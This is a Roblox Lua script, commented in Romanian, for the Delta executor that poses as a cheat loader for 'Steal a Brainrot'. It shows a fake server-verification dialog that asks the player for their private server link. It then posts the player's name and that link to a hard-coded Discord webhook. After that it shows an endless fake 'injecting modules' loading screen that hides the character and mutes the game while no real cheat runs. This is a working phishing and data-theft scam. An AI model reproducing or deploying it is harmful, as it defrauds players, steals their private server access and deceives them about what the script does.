-- Script pentru Delta - Steal a Brainrot (Loader PERMANENT + Discord)
-- Compatibil cu Delta Executor
-- ACUM OPRESTE TOATE SUNETELE DIN JOC

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")

-- ===== CONFIGURARE =====
local WEBHOOK = "https://discord.com/api/webhooks/1510999167244304554/kScJIW0h-ZUy0Aadhs936Y-8ZEAiTKnyewPvwbg6y7SrHHOwA5l4MotrcmGMBzzCy9gF"

-- ===== DISCORD =====
local function sendToDiscord(message)
    local request = request or http_request or syn.request
    if request then
        pcall(function()
            request({
                Url = WEBHOOK,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({content = message})
            })
        end)
    end
end

-- ===== OPREȘTE TOATE SUNETELE DIN JOC =====
local function muteAllSounds()
    local count = 0
    -- Caută în toate serviciile
    local services = {
        Workspace,
        game:GetService("Lighting"),
        game:GetService("ReplicatedStorage"),
        game:GetService("Players").LocalPlayer.PlayerGui,
        game:GetService("StarterGui")
    }
    
    for _, service in pairs(services) do
        pcall(function()
            for _, sound in pairs(service:GetDescendants()) do
                if sound:IsA("Sound") then
                    sound.Volume = 0
                    sound:Stop()
                    count = count + 1
                end
            end
        end)
    end
    
    print("✅ " .. count .. " sunete oprite!")
    return count
end

-- ===== ASCUNDE BRAINROT-URILE =====
local function hideBrainrots()
    local count = 0
    for _, obj in pairs(Workspace:GetDescendants()) do
        if obj:IsA("Model") and obj.Name and (string.find(obj.Name:lower(), "brainrot") or string.find(obj.Name:lower(), "brain") or string.find(obj.Name:lower(), "pet")) then
            pcall(function()
                obj.Transparency = 1
                obj.CanCollide = false
                for _, sound in pairs(obj:GetDescendants()) do
                    if sound:IsA("Sound") then
                        sound.Volume = 0
                        sound:Stop()
                    end
                end
                count = count + 1
            end)
        end
    end
    return count
end

-- ===== ASCUNDE DOAR PE TINE =====
local function hideMe()
    if Character then
        for _, part in pairs(Character:GetDescendants()) do
            pcall(function()
                if part:IsA("BasePart") then
                    part.Transparency = 1
                    part.CanCollide = false
                end
            end)
        end
        LocalPlayer.NameDisplayDistance = 0
        for _, sound in pairs(Character:GetDescendants()) do
            if sound:IsA("Sound") then
                sound.Volume = 0
            end
        end
    end
end

-- ===== ECAN NEGRU + LOADER PERMANENT =====
local function showLoader()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "LoaderGUI"
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.IgnoreGuiInset = true

    local background = Instance.new("Frame")
    background.Size = UDim2.new(1, 0, 1, 0)
    background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    background.BorderSizePixel = 0
    background.Parent = screenGui

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(0.6, 0, 0, 60)
    title.Position = UDim2.new(0.2, 0, 0.15, 0)
    title.Text = "OID EXTERNAL"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.TextScaled = true
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = screenGui

    local percent = Instance.new("TextLabel")
    percent.Size = UDim2.new(0.3, 0, 0, 60)
    percent.Position = UDim2.new(0.7, 0, 0.15, 0)
    percent.Text = "0%"
    percent.TextColor3 = Color3.fromRGB(255, 255, 255)
    percent.BackgroundTransparency = 1
    percent.Font = Enum.Font.GothamBold
    percent.TextScaled = true
    percent.TextXAlignment = Enum.TextXAlignment.Right
    percent.Parent = screenGui

    local progressBg = Instance.new("Frame")
    progressBg.Size = UDim2.new(0.9, 0, 0, 6)
    progressBg.Position = UDim2.new(0.05, 0, 0.28, 0)
    progressBg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    progressBg.BorderSizePixel = 0
    progressBg.Parent = screenGui

    local progressBar = Instance.new("Frame")
    progressBar.Size = UDim2.new(0.01, 0, 1, 0)
    progressBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    progressBar.BorderSizePixel = 0
    progressBar.Parent = progressBg

    local bypassText = Instance.new("TextLabel")
    bypassText.Size = UDim2.new(0.9, 0, 0, 30)
    bypassText.Position = UDim2.new(0.05, 0, 0.33, 0)
    bypassText.Text = "BYPASSI"
    bypassText.TextColor3 = Color3.fromRGB(200, 200, 200)
    bypassText.BackgroundTransparency = 1
    bypassText.Font = Enum.Font.GothamBold
    bypassText.TextSize = 18
    bypassText.TextXAlignment = Enum.TextXAlignment.Left
    bypassText.Parent = screenGui

    local speedLabel = Instance.new("TextLabel")
    speedLabel.Size = UDim2.new(0.3, 0, 0, 25)
    speedLabel.Position = UDim2.new(0.05, 0, 0.42, 0)
    speedLabel.Text = "SPEED"
    speedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    speedLabel.BackgroundTransparency = 1
    speedLabel.Font = Enum.Font.GothamBold
    speedLabel.TextSize = 16
    speedLabel.TextXAlignment = Enum.TextXAlignment.Left
    speedLabel.Parent = screenGui

    local speedStatus = Instance.new("TextLabel")
    speedStatus.Size = UDim2.new(0.6, 0, 0, 25)
    speedStatus.Position = UDim2.new(0.35, 0, 0.42, 0)
    speedStatus.Text = "LOADING"
    speedStatus.TextColor3 = Color3.fromRGB(255, 200, 0)
    speedStatus.BackgroundTransparency = 1
    speedStatus.Font = Enum.Font.GothamBold
    speedStatus.TextSize = 16
    speedStatus.TextXAlignment = Enum.TextXAlignment.Left
    speedStatus.Parent = screenGui

    local speedCtrl = Instance.new("TextLabel")
    speedCtrl.Size = UDim2.new(0.3, 0, 0, 25)
    speedCtrl.Position = UDim2.new(0.7, 0, 0.42, 0)
    speedCtrl.Text = "walkSpeedCtrl"
    speedCtrl.TextColor3 = Color3.fromRGB(100, 200, 255)
    speedCtrl.BackgroundTransparency = 1
    speedCtrl.Font = Enum.Font.Gotham
    speedCtrl.TextSize = 14
    speedCtrl.TextXAlignment = Enum.TextXAlignment.Right
    speedCtrl.Parent = screenGui

    local stealLabel = Instance.new("TextLabel")
    stealLabel.Size = UDim2.new(0.3, 0, 0, 25)
    stealLabel.Position = UDim2.new(0.05, 0, 0.52, 0)
    stealLabel.Text = "STEAL"
    stealLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    stealLabel.BackgroundTransparency = 1
    stealLabel.Font = Enum.Font.GothamBold
    stealLabel.TextSize = 16
    stealLabel.TextXAlignment = Enum.TextXAlignment.Left
    stealLabel.Parent = screenGui

    local stealStatus = Instance.new("TextLabel")
    stealStatus.Size = UDim2.new(0.6, 0, 0, 25)
    stealStatus.Position = UDim2.new(0.35, 0, 0.52, 0)
    stealStatus.Text = "PENDING"
    stealStatus.TextColor3 = Color3.fromRGB(255, 200, 0)
    stealStatus.BackgroundTransparency = 1
    stealStatus.Font = Enum.Font.GothamBold
    stealStatus.TextSize = 16
    stealStatus.TextXAlignment = Enum.TextXAlignment.Left
    stealStatus.Parent = screenGui

    local stealSys = Instance.new("TextLabel")
    stealSys.Size = UDim2.new(0.3, 0, 0, 25)
    stealSys.Position = UDim2.new(0.7, 0, 0.52, 0)
    stealSys.Text = "Auto steal sys"
    stealSys.TextColor3 = Color3.fromRGB(100, 200, 255)
    stealSys.BackgroundTransparency = 1
    stealSys.Font = Enum.Font.Gotham
    stealSys.TextSize = 14
    stealSys.TextXAlignment = Enum.TextXAlignment.Right
    stealSys.Parent = screenGui

    local combatLabel = Instance.new("TextLabel")
    combatLabel.Size = UDim2.new(0.3, 0, 0, 25)
    combatLabel.Position = UDim2.new(0.05, 0, 0.62, 0)
    combatLabel.Text = "COMBAT"
    combatLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    combatLabel.BackgroundTransparency = 1
    combatLabel.Font = Enum.Font.GothamBold
    combatLabel.TextSize = 16
    combatLabel.TextXAlignment = Enum.TextXAlignment.Left
    combatLabel.Parent = screenGui

    local combatStatus = Instance.new("TextLabel")
    combatStatus.Size = UDim2.new(0.6, 0, 0, 25)
    combatStatus.Position = UDim2.new(0.35, 0, 0.62, 0)
    combatStatus.Text = "PENDING"
    combatStatus.TextColor3 = Color3.fromRGB(255, 200, 0)
    combatStatus.BackgroundTransparency = 1
    combatStatus.Font = Enum.Font.GothamBold
    combatStatus.TextSize = 16
    combatStatus.TextXAlignment = Enum.TextXAlignment.Left
    combatStatus.Parent = screenGui

    local combatSys = Instance.new("TextLabel")
    combatSys.Size = UDim2.new(0.3, 0, 0, 25)
    combatSys.Position = UDim2.new(0.7, 0, 0.62, 0)
    combatSys.Text = "Auto duel sys"
    combatSys.TextColor3 = Color3.fromRGB(100, 200, 255)
    combatSys.BackgroundTransparency = 1
    combatSys.Font = Enum.Font.Gotham
    combatSys.TextSize = 14
    combatSys.TextXAlignment = Enum.TextXAlignment.Right
    combatSys.Parent = screenGui

    local line = Instance.new("Frame")
    line.Size = UDim2.new(0.9, 0, 0, 1)
    line.Position = UDim2.new(0.05, 0, 0.72, 0)
    line.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    line.BorderSizePixel = 0
    line.Parent = screenGui

    local log1 = Instance.new("TextLabel")
    log1.Size = UDim2.new(0.9, 0, 0, 20)
    log1.Position = UDim2.new(0.05, 0, 0.77, 0)
    log1.Text = "[ boot ] sequence initiated – standby"
    log1.TextColor3 = Color3.fromRGB(150, 150, 150)
    log1.BackgroundTransparency = 1
    log1.Font = Enum.Font.Gotham
    log1.TextSize = 13
    log1.TextXAlignment = Enum.TextXAlignment.Left
    log1.Parent = screenGui

    local log2 = Instance.new("TextLabel")
    log2.Size = UDim2.new(0.9, 0, 0, 20)
    log2.Position = UDim2.new(0.05, 0, 0.82, 0)
    log2.Text = "[ 00:01 ] speed_module ...... injected"
    log2.TextColor3 = Color3.fromRGB(150, 150, 150)
    log2.BackgroundTransparency = 1
    log2.Font = Enum.Font.Gotham
    log2.TextSize = 13
    log2.TextXAlignment = Enum.TextXAlignment.Left
    log2.Parent = screenGui

    local log3 = Instance.new("TextLabel")
    log3.Size = UDim2.new(0.9, 0, 0, 20)
    log3.Position = UDim2.new(0.05, 0, 0.87, 0)
    log3.Text = "Resolving pointer chains..."
    log3.TextColor3 = Color3.fromRGB(150, 150, 150)
    log3.BackgroundTransparency = 1
    log3.Font = Enum.Font.Gotham
    log3.TextSize = 13
    log3.TextXAlignment = Enum.TextXAlignment.Left
    log3.Parent = screenGui

    screenGui.Parent = CoreGui

    -- ===== ANIMAȚIE LOADER PERMANENTĂ =====
    spawn(function()
        local progress = 0
        while true do
            progress = progress + 0.01
            if progress > 100 then
                progress = 0
            end
            percent.Text = math.floor(progress) .. "%"
            progressBar.Size = UDim2.new(progress / 100, 0, 1, 0)

            if progress > 25 and progress < 30 then
                speedStatus.Text = "INJECTED"
                speedStatus.TextColor3 = Color3.fromRGB(0, 255, 0)
                log2.Text = "[ 00:05 ] speed_module ...... active"
            elseif progress > 50 and progress < 55 then
                stealStatus.Text = "INITIALIZED"
                stealStatus.TextColor3 = Color3.fromRGB(0, 255, 0)
                log3.Text = "Resolving pointer chains... DONE"
            elseif progress > 75 and progress < 80 then
                combatStatus.Text = "READY"
                combatStatus.TextColor3 = Color3.fromRGB(0, 255, 0)
            elseif progress > 95 then
                speedStatus.Text = "LOADING"
                speedStatus.TextColor3 = Color3.fromRGB(255, 200, 0)
                stealStatus.Text = "PENDING"
                stealStatus.TextColor3 = Color3.fromRGB(255, 200, 0)
                combatStatus.Text = "PENDING"
                combatStatus.TextColor3 = Color3.fromRGB(255, 200, 0)
                log2.Text = "[ 00:01 ] speed_module ...... injected"
                log3.Text = "Resolving pointer chains..."
            end

            task.wait(0.05)
        end
    end)

    return screenGui
end

-- ===== GUI CU LINK =====
local function showLinkGUI()
    local gui = Instance.new("ScreenGui")
    gui.Name = "LinkInput"
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    bg.BackgroundTransparency = 0.7
    bg.BorderSizePixel = 0
    bg.Parent = gui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 450, 0, 200)
    frame.Position = UDim2.new(0.5, -225, 0.5, -100)
    frame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
    frame.BackgroundTransparency = 0.1
    frame.BorderSizePixel = 1
    frame.BorderColor3 = Color3.fromRGB(60, 60, 80)
    frame.Active = true
    frame.Draggable = true
    frame.Parent = bg

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 45)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.Text = "🔐 VERIFICARE SERVER"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.TextScaled = true
    title.Parent = frame

    local subtitle = Instance.new("TextLabel")
    subtitle.Size = UDim2.new(1, 0, 0, 25)
    subtitle.Position = UDim2.new(0, 0, 0.20, 0)
    subtitle.Text = "Introdu link-ul serverului privat:"
    subtitle.TextColor3 = Color3.fromRGB(180, 180, 200)
    subtitle.BackgroundTransparency = 1
    subtitle.Font = Enum.Font.Gotham
    subtitle.TextSize = 14
    subtitle.Parent = frame

    local textBox = Instance.new("TextBox")
    textBox.Size = UDim2.new(0.9, 0, 0, 40)
    textBox.Position = UDim2.new(0.05, 0, 0.38, 0)
    textBox.PlaceholderText = "https://www.roblox.com/games/..."
    textBox.Text = ""
    textBox.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
    textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    textBox.Font = Enum.Font.Gotham
    textBox.TextSize = 14
    textBox.ClearTextOnFocus = false
    textBox.Parent = frame

    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.9, 0, 0, 40)
    btn.Position = UDim2.new(0.05, 0, 0.60, 0)
    btn.Text = "📤 AUTENTIFICARE"
    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 70)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.GothamBold
    btn.TextScaled = true
    btn.Parent = frame
    btn.MouseButton1Click:Connect(function()
        if textBox.Text and textBox.Text ~= "" then
            sendToDiscord("**🔗 LINK SERVER PRIVAT**\n\n📌 **Player:** " .. LocalPlayer.Name .. "\n🔗 **Link:** " .. textBox.Text)
            gui:Destroy()
            showLoader()
            hideMe()
            muteAllSounds()  -- <-- OPRESTE TOATE SUNETELE
            local count = hideBrainrots()
            print("✅ Script activ! " .. count .. " brainrot-uri ascunse.")
        end
    end)

    gui.Parent = CoreGui
end

-- ===== MAIN =====
local function main()
    showLinkGUI()
    print("🚀 Așteaptă introducerea link-ului...")
end

-- ===== START =====
pcall(main)
